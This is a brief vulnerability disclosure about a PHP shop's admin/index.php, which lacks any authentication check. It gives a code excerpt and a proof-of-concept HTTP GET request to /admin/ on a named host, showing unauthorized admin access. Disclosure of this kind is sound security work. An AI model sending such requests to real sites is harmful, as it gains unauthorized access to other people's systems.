### Vulnerability file address

`admin/index.php` There is no authentication check on the cookie or session or header header, resulting in unauthorized access

```php
<?php

session_start();
?>
..........
..........
..........
<?php  //success message
if(isset($_POST['success'])) {
$success = $_POST["success"];
echo "<h1 style='color:#0C0'>Your Product was added successfully &nbsp;&nbsp;  <span class='glyphicon glyphicon-ok'></h1></span>";
}
?></h3>
	</div>
</div></div></div>
<?php include("include/js.php"); ?>
</body>
</html>
```

### POC

```http
GET /admin/ HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220727170250049](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220727170255.png)